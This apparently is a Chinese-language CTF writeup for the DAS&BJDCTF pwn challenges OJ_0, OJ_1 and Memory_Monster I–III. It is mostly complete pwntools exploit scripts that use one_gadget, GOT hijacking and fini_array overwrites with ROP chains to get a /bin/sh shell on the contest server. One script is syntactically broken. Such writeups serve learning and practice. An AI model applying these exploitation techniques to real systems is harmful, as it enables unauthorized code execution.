---
layout: post
title: DAS&BJDCTF Writeup
category: pwn
tags: [pwn]
---

### Oj_0

先用printf泄露栈结构，查libc版本，onegadget一把梭。


```python
from pwn import *
context.log_level = 'debug'

p = remote('183.129.189.60',**)

p.recv()
p.recvuntil('@')
p.recv()


payload = 
'''
    int main()
    {
        long int a[1];
        a[3]+=282918;  #one_gadget
        return 0;
    } 
'''
p.sendline(payload)
p.interactive()
```


### OJ_1

同样的，onegadget，用汇编写。
附上链接
[不用括号输出Hello,World](https://jlkl.github.io/2017/10/14/%E6%9C%89%E8%B6%A3%E7%9A%84%E2%80%9CHello%20World%E2%80%9D/)

```python
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

p = remote('183.129.189.60',10002)

p.recv()
p.recvuntil('@')
p.recv()

s = asm('''
    push rbp
    mov rbp,rsp
    sub rsp,10
    mov rax ,[rbp+8]
    add rax, 0xd0917
    mov [rbp+8],rax
    leave
    ret
''')

result = ''
result += 'const char main=%s' % hex(ord(s[0]))
for i in range(1, len(s)):
    result += ', main%d=%s' % (i, hex(ord(s[i])))
result += ';'

payload = result+'@'

p.sendline(payload)
p.interactive()
```

### Memory_Monster_I

劫持got表，触发canary。

```python
from pwn import *
context.log_level = 'debug'

p = remote('183.129.189.60',10081)
#p = process('./Memory_Monster_I')
elf = ELF('./Memory_Monster_I')


check_addr = 0x404028
pwn_addr = 0x040124a

#gdb.attach(p,'b *0x401238')
p.recvuntil('r:')
payload = p64(check_addr)+'a'*0x25
p.send(payload)

p.recvuntil('a:')
payload = p64(pwn_addr)
p.send(payload)

p.interactive()
```
### Memory_Monster_II

改写_fini_array[1]为main，_fini_array[0]为__libc_csu_fini,实现多次写。

```python
from pwn import *
context.log_level = 'debug'

#sh = remote('183.129.189.60',10104)
sh = process('./Memory_Monster_II')

fini_addr = 0x00000000004B80B0
libc_csu = 0x0000000000402CB0
main_addr = 0x0000000000401C1D
leave_ret = 0x0000000000401CF3
bin_addr = 0x0000000000492895
esp = fini_addr + 0x10
ret = 0x0000000000401016
pop_rdx = 0x0000000000448415
pop_rax = 0x0000000000448fcc 
pop_rsi = 0x0000000000406f80
pop_rdi = 0x0000000000401746
syscall = 0x0000000000402514 

def write(addr,data):
    sh.recvuntil('addr:')
    sh.send(p64(addr))
    sh.recvuntil('data:')
    sh.send(data)
#gdb.attach(sh)


write(fini_addr,p64(libc_csu)+p64(main_addr))
write(esp,p64(pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(pop_rdi))
write(esp+24,p64(bin_addr))
write(esp+32,p64(pop_rsi))
write(esp+40,p64(0))
write(esp+48,p64(pop_rdx))
write(esp+56,p64(0))
write(esp+64,p64(syscall))

write(fini_addr,p64(leave_ret)+p64(ret))


sh.interactive()
```



### Memory_Monster_III

同Memory_Monster_II，找个地方写入'/bin/sh\x00'

```python
from pwn import *
context.log_level = 'debug'

#sh = remote('183.129.189.60',10008)
sh = process('./Memory_Monster_III')

fini_addr = 0x00000000004B50B0
libc_csu = 0x0000000000402CA0
main_addr = 0x0000000000401C1D
leave_ret = 0x0000000000401CF3
bin_addr = 0x00000000004bd790 
esp = fini_addr + 0x10
ret = 0x0000000000401016
pop_rdx = 0x0000000000447635
pop_rax = 0x000000000044806c
pop_rsi = 0x0000000000406f70
pop_rdi = 0x0000000000401746 
syscall = 0x0000000000402504 


def write(addr,data):
    sh.recvuntil('addr:')
    sh.send(p64(addr))
    sh.recvuntil('data:')
    sh.send(data)
#gdb.attach(sh)

write(fini_addr,p64(libc_csu)+p64(main_addr))

write(bin_addr,'/bin/sh\x00')
write(esp,p64(pop_rax))
write(esp+8,p64(0x3b))
write(esp+16,p64(pop_rdi))
write(esp+24,p64(bin_addr))
write(esp+32,p64(pop_rsi))
write(esp+40,p64(0))
write(esp+48,p64(pop_rdx))
write(esp+56,p64(0))
write(esp+64,p64(syscall))

write(fini_addr,p64(leave_ret)+p64(ret))


sh.interactive()
```